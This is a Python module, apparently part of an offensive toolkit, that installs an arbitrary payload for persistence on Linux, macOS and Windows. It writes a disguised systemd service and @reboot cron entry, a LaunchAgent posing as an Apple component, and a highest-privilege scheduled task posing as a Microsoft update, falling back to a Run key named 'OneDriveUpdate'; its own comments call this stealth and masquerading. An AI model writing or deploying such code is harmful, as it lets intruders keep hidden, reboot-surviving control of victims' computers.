import os
import subprocess
import platform
from rich.console import Console

console = Console()


class PersistenceEngine:
    def __init__(self, payload_path):
        self.path = os.path.abspath(payload_path)
        self.os_type = platform.system()

    def install_linux_watchdog(self):
        """Creates a dual-point persistence loop for Linux."""
        service_path = "/etc/systemd/system/sys-cache-update.service"
        service_code = f"""[Unit]\nDescription=System Cache Updater\n[Service]\nExecStart={self.path}\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=multi-user.target"""
        cron_cmd = f"(crontab -l 2>/dev/null; echo '@reboot {self.path}') | crontab -"

        try:
            if os.getuid() == 0:
                with open(service_path, "w") as f:
                    f.write(service_code)
                subprocess.run(["systemctl", "daemon-reload"],
                               capture_output=True)
                subprocess.run(
                    ["systemctl", "enable", "sys-cache-update"], capture_output=True)
                console.print(
                    "[bold green][+] Systemd Stealth Service established.[/bold green]")

            result = subprocess.run(cron_cmd, shell=True, capture_output=True)
            if result.returncode == 0:
                console.print(
                    "[bold green][+] Cron reboot persistence established.[/bold green]")
        except Exception as e:
            console.print(f"[red][!] Linux persistence failed: {e}[/red]")

    def install_mac_launchagent(self):
        """Implements macOS persistence using LaunchAgents."""
        try:
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.sys.cache.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            agent_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(agent_dir, exist_ok=True)
            plist_path = os.path.join(
                agent_dir, "com.apple.sys.cache.updater.plist")

            with open(plist_path, "w") as f:
                f.write(plist_content)

            subprocess.run(["launchctl", "load", plist_path],
                           capture_output=True)
            console.print(
                "[bold green][+] macOS LaunchAgent persistence established.[/bold green]")
        except Exception as e:
            console.print(f"[red][!] macOS persistence failed: {e}[/red]")

    def install_windows_schtask(self):
        """Advanced Windows Persistence: Scheduled Tasks masquerading as an update."""
        try:
            # Create a scheduled task that runs on logon, hidden from the UI if possible
            cmd = f'schtasks /create /tn "Microsoft\\Windows\\Wininet\\CacheUpdater" /tr "{self.path}" /sc onlogon /rl highest /f'
            result = subprocess.run(cmd, shell=True, capture_output=True)
            if result.returncode == 0:
                console.print(
                    "[bold green][+] Windows Scheduled Task persistence established.[/bold green]")
            else:
                console.print(
                    f"[yellow][!] Scheduled task failed (requires admin). Fallback to Registry...[/yellow]")
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, "OneDriveUpdate",
                                      0, winreg.REG_SZ, self.path)
                console.print(
                    "[bold green][+] Windows Registry 'Run' key established.[/bold green]")
        except Exception as e:
            console.print(f"[red][!] Windows persistence failed: {e}[/red]")

    def run(self):
        console.print(f"[*] Deploying Persistence for: {self.path}")
        if self.os_type == "Linux":
            self.install_linux_watchdog()
        elif self.os_type == "Darwin":
            self.install_mac_launchagent()
        elif self.os_type == "Windows":
            self.install_windows_schtask()
        else:
            console.print(
                f"[yellow][!] OS ({self.os_type}) not supported.[/yellow]")
